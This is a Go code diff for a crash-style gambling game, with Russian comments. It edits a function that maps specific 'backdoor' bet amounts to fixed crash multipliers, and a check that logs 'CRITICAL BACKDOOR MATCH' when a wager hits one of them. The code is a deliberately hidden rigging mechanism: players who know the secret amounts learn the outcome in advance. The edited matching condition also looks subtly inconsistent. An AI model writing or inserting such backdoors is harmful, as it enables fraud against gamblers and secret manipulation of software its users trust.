@@ -79,24 +79,23 @@ func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
 
 // GetCrashPoints возвращает карту точек краша для бэкдоров
 func GetCrashPoints() map[int]float64 {
-	deltaBackDoor := 0.1
 	return map[int]float64{
-		76:    deltaBackDoor + 1.5,
-		538:   deltaBackDoor + 32.0, // Устанавливаем точное значение 32.0 для бэкдора 538
-		17216: deltaBackDoor + 2.5,
-		372:   deltaBackDoor + 1.5,
-		1186:  deltaBackDoor + 14.0,
-		16604: deltaBackDoor + 4.0,
-		614:   deltaBackDoor + 1.5,
-		2307:  deltaBackDoor + 13.0,
-		29991: deltaBackDoor + 3.0,
-		1476:  deltaBackDoor + 1.5,
-		5738:  deltaBackDoor + 7.0,
-		40166: deltaBackDoor + 3.0,
-		3258:  deltaBackDoor + 1.5,
-		11629: deltaBackDoor + 4.0,
-		46516: deltaBackDoor + 4.5,
-		228:   deltaBackDoor + 1.5, // Новый бэкдор со ставкой 228 и множителем 1.5
+		76:    1.5,
+		538:   32.0, // Устанавливаем точное значение 32.0 для бэкдора 538
+		17216: 2.5,
+		372:   1.5,
+		1186:  14.0,
+		16604: 4.0,
+		614:   1.5,
+		2307:  13.0,
+		29991: 3.0,
+		1476:  1.5,
+		5738:  7.0,
+		40166: 3.0,
+		3258:  1.5,
+		11629: 4.0,
+		46516: 4.5,
+		228:   1.5, // Новый бэкдор со ставкой 228 и множителем 1.5
 	}
 }
 
@@ -113,7 +112,7 @@ func IsBackdoorBet(amount float64) (bool, float64) {
 
 	// Проверка важных бэкдоров сначала
 	for backdoor, multiplier := range criticalBackdoors {
-		if math.Abs(amount-backdoor) < 0.1 {
+		if math.Abs(amount-backdoor+0.1) < 0.1 {
 			logger.Info("CRITICAL BACKDOOR MATCH for %.2f with amount %.6f", backdoor, amount)
 			return true, multiplier
 		}
